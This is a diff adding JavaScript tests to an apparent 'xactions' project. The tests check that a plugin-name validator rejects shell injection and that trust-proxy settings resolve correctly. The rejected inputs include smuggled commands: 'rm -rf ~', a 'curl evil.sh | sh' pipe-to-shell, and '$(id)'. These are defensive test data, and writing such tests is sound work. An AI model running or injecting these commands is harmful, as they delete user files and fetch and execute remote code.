@@ -150,3 +150,26 @@ describe('routes that once had no authorization', () => {
     }
   });
 });
+
+describe('plugin install cannot run a shell command', () => {
+  it('accepts only whole npm package names in the plugin namespace', async () => {
+    const { isValidPluginName } = await import('../../src/plugins/loader.js');
+    for (const name of ['xactions-plugin-foo', 'xactions-plugin-foo@1.2.3', '@xactions/bar', '@xactions/bar@^2.0.0']) {
+      expect(isValidPluginName(name), name).toBe(true);
+    }
+    for (const name of ['xactions-plugin-x; rm -rf ~', 'xactions-plugin-x && curl evil.sh | sh', 'xactions-plugin-$(id)', '@xactions/a b', 'left-pad']) {
+      expect(isValidPluginName(name), name).toBe(false);
+    }
+  });
+});
+
+describe('trust proxy', () => {
+  it('is on only when configured or on a platform with one proxy in front', async () => {
+    const { resolveTrustProxy } = await import('../../api/server.js');
+    expect(resolveTrustProxy({})).toBe(false);
+    expect(resolveTrustProxy({ TRUST_PROXY: '2' })).toBe(2);
+    expect(resolveTrustProxy({ TRUST_PROXY: 'loopback' })).toBe('loopback');
+    expect(resolveTrustProxy({ TRUST_PROXY: 'false', FLY_APP_NAME: 'x' })).toBe(false);
+    expect(resolveTrustProxy({ RAILWAY_ENVIRONMENT: 'production' })).toBe(1);
+  });
+});
